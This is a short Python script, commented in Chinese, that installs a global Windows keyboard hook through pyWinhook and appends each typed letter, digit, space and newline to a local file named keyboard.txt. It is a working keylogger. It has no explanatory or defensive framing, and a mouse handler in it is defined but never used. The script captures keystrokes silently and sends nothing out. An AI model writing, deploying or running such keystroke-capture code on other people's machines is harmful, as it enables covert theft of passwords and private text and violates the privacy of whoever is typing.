import pyWinhook
import pythoncom
storage = ""


# 监听到鼠标事件调用
def onMouseEvent(event):
    if event.MessageName != "mouse move":  # 因为鼠标一动就会有很多mouse move，所以把这个过滤下
        print(event.MessageName)
    return True  # 为True才会正常调用，如果为False的话，此次事件被拦截


# 监听到键盘事件调用
def onKeyboardEvent(event):
    global storage
    # print(event.Key)  # 返回按下的键
    candi = str(event.Key)
    if candi.isdigit() or candi.isalpha() or candi.isspace():
        with open("keyboard.txt", 'a+') as f:
            if candi.isupper():
                f.write(candi.lower())
            elif candi == 'Space':
                f.write(" ")
            elif candi == 'Return':
                f.write('\n')
            elif candi.isdigit() or candi.islower() or candi.isnumeric():
                f.write(candi)
    return True


def main():
    # 创建管理器
    hm = pyWinhook.HookManager()
    # 监听键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    # 循环监听
    pythoncom.PumpMessages()


if __name__ == "__main__":
    main()
